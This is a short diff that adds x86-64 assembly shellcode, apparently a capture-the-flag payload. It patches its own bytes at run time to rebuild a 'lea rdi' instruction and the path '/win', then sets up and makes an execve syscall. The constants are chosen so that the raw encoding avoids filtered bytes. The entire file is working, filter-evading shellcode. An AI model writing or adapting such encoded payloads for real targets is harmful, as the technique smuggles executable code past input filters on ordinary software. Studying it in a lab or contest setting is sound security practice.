@@ -1,0 +1,15 @@
+[BITS 64]
+add dword [rel lea_win],0xb800b8
+lea_win:
+dd 0x103d8d48-0xb800b8
+db 0x00
+db 0x00
+db 0x00
+add dword [rel win],0x80808080
+mov al,59-0x80
+add al,0x80
+syscall
+
+win:
+dd 0x6e69772f-0x80808080
+db 0
